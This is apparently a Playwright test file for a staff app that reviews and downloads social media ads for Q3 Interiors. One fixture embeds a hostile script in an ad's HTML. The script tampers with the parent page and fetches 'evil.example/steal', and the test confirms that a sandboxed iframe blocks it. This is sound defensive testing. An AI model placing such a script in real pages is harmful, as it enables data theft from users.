import fs from 'node:fs'
import { expect, test, type Page } from '@playwright/test'
import { installFakeStaff, signIn, type StaffWorld } from './fake-staff'

const shot = async (page: Page, name: string, width = 390) => {
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(width)
  const dir = process.env.SCREENSHOTS_DIR
  if (dir) await page.screenshot({ path: `${dir}/${name}.png`, fullPage: true })
}

const adHtml = (label: string, extra = '') => `<!doctype html><html><head><style>
  body{margin:0} .ad{width:1440px;height:100vh;display:flex;align-items:center;justify-content:center;
  font:500 120px sans-serif;background:#fff;color:#171717}</style>${extra}</head>
  <body><main class="ad">${label}</main></body></html>`

// A 1x1 PNG and a few bytes standing in for an MP4 (headless Chromium cannot decode H.264 anyway).
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64',
)
const MP4 = Buffer.from('00000020667479706973366d', 'hex')
// For review screenshots only: real posters from a local folder (never in CI).
const POSTERS = process.env.SCREENSHOT_POSTERS
const SLUGS: Record<string, string> = {
  t1: 'hard-to-find',
  t2: 'hard-to-find',
  t3: 'chasing-trades',
  t5: 'one-team',
  t7: 'twenty-minute-call',
}
const posterFor = (id: string, ratio: '4x5' | '9x16') => {
  const base = POSTERS && SLUGS[id] && `${POSTERS}/${SLUGS[id]}-animated-${ratio}-poster`
  const file = base && [`${base}-v3.png`, `${base}.png`].find((f) => fs.existsSync(f))
  return file ? fs.readFileSync(file) : PNG
}
const LINK =
  'https://book.q3interiors.ie/?utm_source=instagram&utm_medium=paid&utm_campaign=type-test-1&utm_content=one-team-animated#/'

type Seed = {
  id: string
  name: string
  set: string | null
  position: number | null
  status: string
}

function animatedAd(world: StaffWorld, s: Seed, created: string) {
  const variants = (['portrait', 'vertical'] as const).map((size) => {
    const base = `${s.id}/v1/${size}`
    world.adFiles.set(`${base}.mp4`, { body: MP4, type: 'video/mp4' })
    world.adFiles.set(`${base}.poster.png`, {
      body: posterFor(s.id, size === 'portrait' ? '4x5' : '9x16'),
      type: 'image/png',
    })
    world.adFiles.set(`${base}.html`, { body: adHtml(s.name), type: 'text/html' })
    return {
      id: `${s.id}-${size}`,
      size,
      width: 1440,
      height: size === 'portrait' ? 1800 : 2560,
      html_path: `${base}.html`,
      export_path: `${base}.mp4`,
      export_bytes: MP4.length,
      export_type: 'video',
      duration_ms: 8000,
      poster_path: `${base}.poster.png`,
    }
  })
  return {
    id: s.id,
    name: s.name,
    status: s.status,
    set_name: s.set,
    set_position: s.position,
    created_at: created,
    created_by_name: 'Ad studio (Claude session)',
    campaign_creatives: null,
    ad_versions: [
      {
        id: `${s.id}-v1`,
        version: 1,
        caption: `${s.name} One team, start to finish.`,
        headline: s.name,
        button_label: 'Learn more',
        notes: 'Words as supplied.',
        link_url: LINK,
        created_at: created,
        approved_at: s.status === 'approved' ? created : null,
        approved_by_name: s.status === 'approved' ? 'Chris Admin' : null,
        ad_variants: variants,
      },
    ],
    ad_requests: [],
    ad_events: [
      {
        kind: 'published',
        version: 1,
        detail: null,
        actor_name: 'Ad studio (Claude session)',
        created_at: created,
      },
    ],
  }
}

function stillAd(world: StaffWorld, hostile = false) {
  const hostileScript = hostile
    ? '<script>try{parent.document.title="taken";parent.localStorage.setItem("x","1")}catch(e){};fetch("https://evil.example/steal")</script>'
    : ''
  for (const size of ['portrait', 'vertical']) {
    world.adFiles.set(`old/v1/${size}.html`, {
      body: adHtml(size === 'portrait' ? 'Feed 4:5' : 'Stories 9:16', hostileScript),
      type: 'text/html',
    })
    world.adFiles.set(`old/v1/${size}.png`, { body: PNG, type: 'image/png' })
  }
  return {
    id: 'old',
    name: 'Planning a home renovation?',
    status: 'new',
    set_name: 'Samples',
    set_position: 1,
    created_at: '2026-11-25T10:00:00Z',
    created_by_name: 'Ad studio (Claude session)',
    campaign_creatives: {
      id: 'creative-reel-1',
      label: 'Reel 1',
      slug: 'reel-1',
      campaigns: {
        name: 'Spring kitchens',
        slug: 'spring-kitchens',
        utm_source: 'instagram',
        utm_medium: 'paid_social',
        landing_route: '/enquire',
      },
    },
    ad_versions: [
      {
        id: 'old-v1',
        version: 1,
        caption: 'Planning a home renovation? Tell us about your project.',
        headline: 'Tell us about your project',
        button_label: 'Learn more',
        notes: null,
        created_at: '2026-11-25T10:00:00Z',
        ad_variants: (['portrait', 'vertical'] as const).map((size) => ({
          id: `old-${size}`,
          size,
          width: 1440,
          height: size === 'portrait' ? 1800 : 2560,
          html_path: `old/v1/${size}.html`,
          export_path: `old/v1/${size}.png`,
          export_bytes: PNG.length,
        })),
      },
    ],
    ad_requests: [],
  }
}

function seed(world: StaffWorld, opts: { hostile?: boolean } = {}) {
  world.tables.ads = [
    stillAd(world, opts.hostile),
    animatedAd(
      world,
      { id: 't3', name: 'Stop chasing trades.', set: 'Type test 1', position: 3, status: 'new' },
      '2026-11-26T12:00:00Z',
    ),
    animatedAd(
      world,
      {
        id: 't1',
        name: 'Good builders shouldn’t be hard to find.',
        set: 'Type test 1',
        position: 1,
        status: 'new',
      },
      '2026-11-26T10:00:00Z',
    ),
    animatedAd(
      world,
      {
        id: 't5',
        name: 'Your renovation. One team.',
        set: 'Type test 1',
        position: 5,
        status: 'changes_requested',
      },
      '2026-11-26T11:00:00Z',
    ),
    animatedAd(
      world,
      {
        id: 't7',
        name: 'Start with a 20-minute call.',
        set: 'Type test 1',
        position: 7,
        status: 'approved',
      },
      '2026-11-26T11:30:00Z',
    ),
    animatedAd(
      world,
      {
        id: 't2',
        name: 'Good builders shouldn’t be hard to find.',
        set: 'Type test 1',
        position: 2,
        status: 'archived',
      },
      '2026-11-26T09:00:00Z',
    ),
  ]
}

const tiles = (page: Page) => page.getByRole('main').getByRole('listitem')

test('ads not in a campaign are listed by set, filtered by chips; staff cannot select', async ({
  page,
}) => {
  const world = await installFakeStaff(page)
  seed(world)
  await page.goto('/#/ads')
  await signIn(page, 'staff@example.com', 'another long password')
  await expect(page.getByRole('heading', { name: 'Ads', level: 1 })).toBeVisible()
  // To review: new, changes requested; not in a campaign, newest set first, in set order.
  await expect(page.getByRole('main').getByRole('heading', { level: 2 })).toHaveText([
    'Not in a campaign',
  ])
  const sets = page.getByRole('main').getByRole('heading', { level: 3 })
  await expect(sets).toHaveText(['Type test 1', 'Samples'])
  await expect(tiles(page)).toHaveCount(4)
  await expect(tiles(page).nth(0)).toContainText('Good builders shouldn’t be hard to find.')
  await expect(tiles(page).nth(1)).toContainText('Stop chasing trades.')
  await expect(tiles(page).nth(2)).toContainText('Changes requested')
  await expect(page.getByRole('main')).not.toContainText(/\((animated|still)\)|Animated,|Version 1/)
  await expect(tiles(page).first().locator('img')).toHaveAttribute('src', /^blob:/)
  await expect(page.getByRole('button', { name: 'Select' })).toHaveCount(0)
  await shot(page, 'list')

  await page.getByText('Approved', { exact: true }).click()
  await expect(tiles(page)).toHaveCount(1)
  await expect(tiles(page).first()).toContainText('Start with a 20-minute call.')
  await page.getByText('Archived', { exact: true }).click()
  await expect(tiles(page)).toHaveCount(1)
  await page.getByText('All', { exact: true }).click()
  await expect(tiles(page)).toHaveCount(6)
  // The nav count still means ads with status "new".
  await expect(
    page.getByRole('navigation', { name: 'Staff' }).getByRole('link', { name: /Ads/ }),
  ).toContainText('3')
})

test('an admin selects several ads and archives them, and can bring them back', async ({
  page,
}) => {
  const world = await installFakeStaff(page)
  seed(world)
  await page.goto('/#/ads')
  await signIn(page, 'admin@example.com', 'correct horse battery staple')
  await page.getByRole('button', { name: 'Select' }).click()
  await page.getByText('Stop chasing trades.').click()
  await page.getByText('Planning a home renovation?').click()
  await expect(page.getByText('2 selected')).toBeVisible()
  await shot(page, 'list-select')
  await page.getByRole('button', { name: 'Archive 2' }).click()
  await expect(page.getByText('Archived 2 ads. Find them under Archived.')).toBeVisible()
  expect(world.rpcCalls.filter((c) => c.name === 'archive_ad')).toHaveLength(2)
  await expect(tiles(page)).toHaveCount(2)
  await page.getByText('Archived', { exact: true }).click()
  await expect(tiles(page)).toHaveCount(3)
  await page.getByRole('button', { name: 'Select' }).click()
  await page.getByText('Stop chasing trades.').click()
  await page.getByRole('button', { name: 'Bring back 1' }).click()
  await expect(page.getByText('Brought back 1 ad.')).toBeVisible()
  await expect(tiles(page)).toHaveCount(2)
})

test('the ad page: walk the list, Reel, Feed and Still with matching downloads, copy rows', async ({
  page,
  context,
}) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write'])
  const world = await installFakeStaff(page)
  seed(world)
  await page.goto('/#/ads')
  await signIn(page, 'staff@example.com', 'another long password')
  await tiles(page).nth(1).getByRole('link').click()
  await expect(page.getByRole('heading', { name: 'Stop chasing trades.', level: 1 })).toBeVisible()
  const walk = page.getByRole('navigation', { name: 'Ads in this list' })
  await expect(walk).toContainText('2 of 4')
  await walk.getByRole('link', { name: 'Previous' }).click()
  await expect(
    page.getByRole('heading', { name: 'Good builders shouldn’t be hard to find.', level: 1 }),
  ).toBeVisible()
  await expect(walk).toContainText('1 of 4')
  await walk.getByRole('link', { name: 'Next' }).click()
  await expect(walk).toContainText('2 of 4')

  // Reel first: the published MP4, muted, looping, inline; tap toggles play.
  const preview = page.getByRole('region', { name: 'Preview' })
  await expect(preview.getByRole('radio', { name: 'Reel' })).toBeChecked()
  const video = preview.locator('video')
  await expect(video).toHaveAttribute('src', /^blob:/)
  expect(await video.evaluate((v: HTMLVideoElement) => [v.muted, v.loop, v.playsInline])).toEqual([
    true,
    true,
    true,
  ])
  await expect(preview.getByRole('button', { name: /(Play|Pause) the video/ })).toBeVisible()
  await expect(preview.getByText('1440 × 2560 · 8 s')).toBeVisible()
  // No version picker for a single version; no old explanatory paragraphs or buttons.
  await expect(page.getByLabel('Version', { exact: true })).toHaveCount(0)
  await expect(
    page.getByRole('button', { name: /Replay|Download a still of the last frame/ }),
  ).toHaveCount(0)
  await shot(page, 'ad-reel')

  const reel = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Download reel video' }).click()
  const reelFile = await reel
  expect(reelFile.suggestedFilename()).toBe('q3-stop-chasing-trades-v1-9x16-1440x2560.mp4')
  expect(fs.readFileSync((await reelFile.path()) ?? '')).toEqual(MP4)

  await preview.getByText('Feed', { exact: true }).click()
  await expect(preview.getByText('1440 × 1800 · 8 s')).toBeVisible()
  await expect(page.getByRole('button', { name: 'Download feed video' })).toBeVisible()
  await shot(page, 'ad-feed')

  await preview.getByText('Still', { exact: true }).click()
  await expect(preview.getByRole('img', { name: /Stop chasing trades/ })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Download still' })).toBeVisible()
  const still = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Download the 9:16 still' }).click()
  expect((await still).suggestedFilename()).toBe(
    'q3-stop-chasing-trades-v1-9x16-1440x2560-still.png',
  )
  await shot(page, 'ad-still')

  // To post: one row each, copy buttons with names.
  const post = page.getByRole('region', { name: 'To post' })
  await post.getByRole('button', { name: 'Copy link' }).click()
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(LINK)
  await expect(post.getByRole('button', { name: 'Link copied' })).toBeVisible()
  await post.getByRole('button', { name: 'Copy instagram button' }).click()
  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe('Learn more')
  await expect(page.getByText(/not linked to a campaign creative/)).toHaveCount(0)

  // Ask for a change: closed until asked; the open request then shows above the actions.
  await expect(page.getByLabel('What should change?')).toHaveCount(0)
  await page.getByRole('button', { name: 'Ask for a change' }).click()
  await page.getByLabel('What should change?').fill('Slower reveal on the headline')
  await shot(page, 'ad-request-form')
  await page.getByRole('button', { name: 'Save the request' }).click()
  await expect(page.getByText('1 open request')).toBeVisible()
  await expect(page.getByLabel('What should change?')).toHaveCount(0)

  // More holds the notes and the history.
  await page.getByText('More', { exact: true }).click()
  await expect(page.getByText('Words as supplied.')).toBeVisible()
  await expect(page.getByText(/^Published, version 1/)).toBeVisible()
})

test('reduced motion: no autoplay, the poster with a play button', async ({ page }) => {
  await page.emulateMedia({ reducedMotion: 'reduce' })
  const world = await installFakeStaff(page)
  seed(world)
  await page.goto('/#/ads/t1')
  await signIn(page, 'staff@example.com', 'another long password')
  const video = page.getByRole('region', { name: 'Preview' }).locator('video')
  await expect(video).toHaveAttribute('src', /^blob:/)
  await expect(video).toHaveAttribute('poster', /^blob:/)
  expect(await video.evaluate((v: HTMLVideoElement) => v.paused)).toBe(true)
  await expect(page.getByRole('button', { name: 'Play the video' })).toBeVisible()
})

test('an ad published as images shows Feed and Stories in the sandboxed frame', async ({
  page,
}) => {
  const world = await installFakeStaff(page)
  seed(world, { hostile: true })
  const outside: string[] = []
  page.on('request', (r) => {
    if (r.url().includes('evil.example')) outside.push(r.url())
  })
  await page.goto('/#/ads/old')
  await signIn(page, 'admin@example.com', 'correct horse battery staple')
  const preview = page.getByRole('region', { name: 'Preview' })
  await expect(preview.getByRole('radio')).toHaveCount(2)
  await expect(preview.getByRole('radio', { name: 'Feed' })).toBeChecked()
  const frame = page.locator('iframe[title*="feed"]')
  await expect(frame).toHaveAttribute('sandbox', '')
  await expect(frame.contentFrame().getByText('Feed 4:5')).toBeVisible()
  await page.waitForTimeout(500)
  expect(await page.title()).toBe('Q3 Interiors Staff')
  expect(await page.evaluate(() => window.localStorage.getItem('x'))).toBeNull()
  expect(outside).toEqual([])
  expect(await frame.evaluate((f: HTMLIFrameElement) => f.contentDocument === null)).toBe(true)
  expect(await frame.getAttribute('srcdoc')).toContain("default-src 'none'")
  const download = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Download feed image' }).click()
  expect((await download).suggestedFilename()).toBe(
    'q3-planning-a-home-renovation-v1-4x5-1440x1800.png',
  )
  await preview.getByText('Stories', { exact: true }).click()
  await expect(page.getByRole('button', { name: 'Download stories image' })).toBeVisible()
  // The campaign creative's link is used when the version has none.
  await expect(page.getByRole('region', { name: 'To post' })).toContainText(
    'utm_campaign=spring-kitchens&utm_content=reel-1#/enquire',
  )
})

test.describe('desktop', () => {
  test.use({ viewport: { width: 1280, height: 900 }, isMobile: false, hasTouch: false })

  test('preview on the left, the rest on the right', async ({ page }) => {
    const world = await installFakeStaff(page)
    seed(world)
    await page.goto('/#/ads/t3')
    await signIn(page, 'admin@example.com', 'correct horse battery staple')
    const preview = page.getByRole('region', { name: 'Preview' })
    const post = page.getByRole('region', { name: 'To post' })
    await expect(post).toBeVisible()
    const [a, b] = await Promise.all([preview.boundingBox(), post.boundingBox()])
    expect((a?.x ?? 0) + (a?.width ?? 0)).toBeLessThanOrEqual(b?.x ?? 0)
    await expect(page.getByRole('button', { name: 'Approve' })).toBeVisible()
    await shot(page, 'ad-desktop', 1280)
    await page.goto('/#/ads')
    await expect(tiles(page).first()).toBeVisible()
    await shot(page, 'list-desktop', 1280)
  })
})
